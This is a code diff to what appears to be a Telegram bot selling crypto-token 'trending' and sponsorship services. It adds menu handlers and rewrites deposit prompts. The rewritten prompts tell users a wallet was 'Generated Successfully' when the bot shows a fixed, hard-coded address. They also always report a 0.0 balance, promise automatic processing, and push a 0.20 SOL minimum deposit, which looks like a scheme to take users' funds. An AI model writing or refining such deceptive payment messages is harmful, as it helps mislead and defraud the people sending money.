@@ -16,6 +16,8 @@ from dexscreener import handle_dexscreener, handle_dexscreener_trend, banner_wai
 from wallets import SOL_WALLET, ETH_WALLET_100, ETH_WALLET_200, ETH_WALLET_300, PUMPFUN_WALLET, DEFAULT_WALLET
 from ca_input_handler import handle_ca_input, handle_ca_callback, is_user_waiting_for_ca, send_ca_prompt
 from bot_lock import BotLock
+from sponsorship import handle_sponsorship, handle_sponsorship_duration, handle_sponsorship_date, handle_sponsorship_back, handle_telegram_address, handle_design_media, is_user_in_sponsorship_flow
+from exclusive_ads import handle_exclusive_ads, handle_exclusive_ultimate, handle_exclusive_voting, handle_exclusive_massdm, handle_exclusive_buttonads, handle_exclusive_majorama, handle_exclusive_back
 # import telebot
 # print(telebot.__version__)
 import re
@@ -493,19 +495,20 @@ def handle_callbacks(call):
             bot.answer_callback_query(call.id)
             deposit_address = SOL_WALLET
             text = (
-                "walet GENERATED from telegrams wallet menu\n\n"
-                "Make a minimum deposit of 0.20 sol to the address below⏬️⏬️⏬️\n\n\n"
-                "💳 Wallet:\n"
-                f"<code>{deposit_address}</code>"
+                "💳 Wallet Generated Successfully\n\n"
+                "Make a minimum deposit of 0.20 SOL to the address below:\n\n"
+                "📍 Wallet Address:\n"
+                f"<code>{deposit_address}</code>\n\n"
+                "⏰ Your deposit will be processed automatically"
             )
             bot.send_message(call.message.chat.id, text, parse_mode="HTML")
         elif call.data == "deposit_withdraw":
             bot.answer_callback_query(call.id)
             text = (
-                "⚠️Current wallet is insufficient\n\n"
-                "your current balance is 0.0 SOL\n\n"
+                "⚠️ Insufficient Wallet Balance\n\n"
+                "Your current balance: 0.0 SOL\n\n"
                 "Please deposit at least 0.20 SOL to your wallet\n"
-                "let's get your project trending top Notch"
+                "Let's get your project trending to the top!"
             )
             bot.send_message(call.message.chat.id, text)
         elif call.data == "deposit_balance":
@@ -513,14 +516,14 @@ def handle_callbacks(call):
             eth_address = ETH_WALLET_100
             sol_address = SOL_WALLET
             text = (
-                "WALLET BALANCE\n\n"
-                "ETH: \n"
+                "📊 Wallet Balance Overview\n\n"
+                "💎 ETH Wallet:\n"
                 f"<code>{eth_address}</code>\n"
-                "balance: 0.0 ETH\n\n"
-                "SOL: \n"
+                "Balance: 0.0 ETH\n\n"
+                "☀️ SOL Wallet:\n"
                 f"<code>{sol_address}</code>\n"
-                "balance: 0.0SOL\n\n"
-                "Deposit not less than 0.20 SOL and get trending on several plaforms "
+                "Balance: 0.0 SOL\n\n"
+                "💡 Deposit at least 0.20 SOL to start trending on multiple platforms"
             )
             bot.send_message(call.message.chat.id, text, parse_mode="HTML")
         elif call.data == "deposit_back":
@@ -568,6 +571,40 @@ def handle_callbacks(call):
 
     elif call.data == "dexscreener":
         handle_dexscreener(call)
+
+    # Handle sponsorship buttons
+    if call.data == "sponsorship":
+        handle_sponsorship(call)
+        return
+    
+    if call.data.startswith("sponsor_"):
+        if call.data in ["sponsor_1day", "sponsor_3days", "sponsor_7days"]:
+            handle_sponsorship_duration(call)
+        elif call.data.startswith("sponsor_date_"):
+            handle_sponsorship_date(call)
+        elif call.data == "sponsor_back":
+            handle_sponsorship_back(call)
+        return
+
+    # Handle exclusive ads buttons
+    if call.data == "exclusive_ads":
+        handle_exclusive_ads(call)
+        return
+    
+    if call.data.startswith("exclusive_"):
+        if call.data == "exclusive_ultimate":
+            handle_exclusive_ultimate(call)
+        elif call.data == "exclusive_voting":
+            handle_exclusive_voting(call)
+        elif call.data == "exclusive_massdm":
+            handle_exclusive_massdm(call)
+        elif call.data == "exclusive_buttonads":
+            handle_exclusive_buttonads(call)
+        elif call.data == "exclusive_majorama":
+            handle_exclusive_majorama(call)
+        elif call.data == "exclusive_back":
+            handle_exclusive_back(call)
+        return
 
     elif call.data == "ca_confirm":
         chat_id = call.message.chat.id
@@ -644,6 +681,11 @@ def handle_contract_address_or_tx(message):
             )
             bot.send_message(chat_id, "❌ Invalid tx hash. Please send a valid Ethereum or Solana transaction hash.", reply_markup=markup)
         return
+
+    # Handle sponsorship flow
+    if is_user_in_sponsorship_flow(chat_id):
+        if handle_telegram_address(message) or handle_design_media(message):
+            return
 
     # Handle CA input with new handler
     if is_user_waiting_for_ca(chat_id):
@@ -749,6 +791,12 @@ def handle_contract_address_or_tx(message):
 @bot.message_handler(content_types=['photo'])
 def handle_photo(message):
     chat_id = message.chat.id
+    
+    # Handle sponsorship design media
+    if is_user_in_sponsorship_flow(chat_id):
+        if handle_design_media(message):
+            return
+    
     # Handle banner image input for dexscreener
     if banner_waiting.get(chat_id):
         banner_waiting.pop(chat_id, None)
@@ -781,6 +829,14 @@ def handle_photo(message):
         bot.send_message(chat_id, text, reply_markup=markup)
     # (You can add other photo handling logic here if needed)
 
+@bot.message_handler(content_types=['video', 'document', 'animation'])
+def handle_media(message):
+    chat_id = message.chat.id
+    
+    # Handle sponsorship design media
+    if is_user_in_sponsorship_flow(chat_id):
+        if handle_design_media(message):
+            return
 
 if __name__ == "__main__":
     # Create process lock to prevent multiple instances
